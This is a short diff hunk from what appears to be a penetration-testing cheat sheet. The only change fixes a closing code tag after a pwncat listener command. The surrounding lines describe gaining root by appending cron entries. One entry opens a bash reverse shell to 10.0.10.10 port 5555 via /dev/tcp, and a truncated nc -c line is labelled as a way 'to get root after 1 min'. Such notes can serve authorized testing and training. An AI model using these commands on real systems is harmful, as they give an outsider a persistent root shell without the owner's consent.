@@ -340,7 +340,7 @@ add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c
 
 example 1.
 
-First start listner<code>pwncat -l -p 5555<code>
+First start listner<code>pwncat -l -p 5555</code>
 
 then <code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/crontab</code>
 
